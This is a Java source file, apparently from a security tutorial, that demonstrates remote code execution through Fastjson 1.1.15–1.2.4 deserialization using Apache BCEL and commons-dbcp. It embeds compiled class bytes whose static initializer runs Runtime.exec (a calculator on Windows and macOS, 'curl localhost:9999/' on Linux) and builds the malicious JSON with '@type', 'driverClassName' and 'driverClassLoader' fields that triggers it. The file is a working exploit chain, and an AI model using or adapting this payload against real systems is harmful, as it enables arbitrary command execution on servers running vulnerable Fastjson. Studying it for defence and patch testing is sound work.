package com.anbai.sec.classloader;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.bcel.classfile.Utility;
import org.apache.bcel.util.ClassLoader;
import org.apache.commons.dbcp.BasicDataSource;
import org.javaweb.utils.FileUtils;

import java.io.File;
import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.Map;

public class BCELClassLoader {

	/**
	 * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
	 * <pre>
	 * package com.anbai.sec.classloader;
	 *
	 * import java.io.IOException;
	 *
	 * public class TestBCELClass {
	 *
	 * 	static {
	 * 		String command = "open -a Calculator.app";
	 * 		String osName  = System.getProperty("os.name");
	 *
	 * 		if (osName.startsWith("Windows")) {
	 * 			command = "calc 12345678901234567";
	 *      } else if (osName.startsWith("Linux")) {
	 * 			command = "curl localhost:9999/";
	 *       }
	 *
	 * 		try {
	 * 			Runtime.getRuntime().exec(command);
	 *      } catch (IOException e) {
	 * 			e.printStackTrace();
	 *      }
	 *   }
	 * }
	 * </pre>
	 */
	private static final byte[] CLASS_BYTES = new byte[]{
			-54, -2, -70, -66, 0, 0, 0, 50, 0, 56, 10, 0, 15, 0, 26, 8, 0, 27, 8, 0, 28, 10, 0, 29, 0, 30, 8, 0, 31,
			10, 0, 32, 0, 33, 8, 0, 34, 8, 0, 35, 8, 0, 36, 10, 0, 37, 0, 38, 10, 0, 37, 0, 39, 7, 0, 40, 10, 0, 12,
			0, 41, 7, 0, 42, 7, 0, 43, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111,
			100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 8, 60, 99,
			108, 105, 110, 105, 116, 62, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 44,
			7, 0, 40, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 84, 101, 115, 116, 66, 67,
			69, 76, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32,
			45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110,
			97, 109, 101, 7, 0, 45, 12, 0, 46, 0, 47, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 44, 12, 0, 48,
			0, 49, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55,
			1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115,
			116, 58, 57, 57, 57, 57, 47, 7, 0, 50, 12, 0, 51, 0, 52, 12, 0, 53, 0, 54, 1, 0, 19, 106, 97, 118, 97, 47,
			105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 55, 0, 17, 1, 0, 39, 99, 111, 109,
			47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47,
			84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110,
			103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114,
			105, 110, 103, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0,
			11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,
			110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83,
			116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76,
			106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97,
			118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117,
			110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110,
			116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110,
			103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114,
			111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101,
			0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 2, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0,
			5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 8, 0, 20, 0, 17, 0, 1, 0, 18,
			0, 0, 0, -106, 0, 2, 0, 3, 0, 0, 0, 53, 18, 2, 75, 18, 3, -72, 0, 4, 76, 43, 18, 5, -74, 0, 6, -103, 0,
			9, 18, 7, 75, -89, 0, 15, 43, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 75, -72, 0, 10, 42, -74, 0, 11, 87,
			-89, 0, 8, 77, 44, -74, 0, 13, -79, 0, 1, 0, 36, 0, 44, 0, 47, 0, 12, 0, 2, 0, 19, 0, 0, 0, 46, 0, 11,
			0, 0, 0, 8, 0, 3, 0, 9, 0, 9, 0, 11, 0, 18, 0, 12, 0, 24, 0, 13, 0, 33, 0, 14, 0, 36, 0, 18, 0, 44, 0,
			21, 0, 47, 0, 19, 0, 48, 0, 20, 0, 52, 0, 22, 0, 21, 0, 0, 0, 19, 0, 4, -3, 0, 24, 7, 0, 22, 7, 0, 22,
			11, 74, 7, 0, 23, -7, 0, 4, 0, 1, 0, 24, 0, 0, 0, 2, 0, 25
	};

	/**
	 * 将一个Class文件编码成BCEL类
	 *
	 * @param classFile Class文件路径
	 * @return 编码后的BCEL类
	 * @throws IOException 文件读取异常
	 */
	public static String bcelEncode(File classFile) throws IOException {
		return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
	}

	/**
	 * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9
	 *
	 * @throws Exception 类加载异常
	 */
	public static void bcelTest() throws Exception {
		// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
//		Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");

		// 创建BCEL类加载器
//			ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
//			ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
		ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();

		// BCEL编码类字节码
		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);

		System.out.println(className);

		Class<?> clazz = Class.forName(className, true, classLoader);

		System.out.println(clazz);
	}

	/**
	 * Fastjson 1.1.15 - 1.2.4反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel
	 *
	 * @throws IOException BCEL编码异常
	 */
	public static void fastjsonRCE() throws IOException {
		// BCEL编码类字节码
		String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);

		// 构建恶意的JSON
		Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
		Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();

		dataMap.put("@type", BasicDataSource.class.getName());
		dataMap.put("driverClassName", className);

		classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
		dataMap.put("driverClassLoader", classLoaderMap);

		String json = JSON.toJSONString(dataMap);
		System.out.println(json);

		JSONObject jsonObject = JSON.parseObject(json);
		System.out.println(jsonObject);
	}

	public static void main(String[] args) throws Exception {
//		bcelTest();
		fastjsonRCE();
	}

}
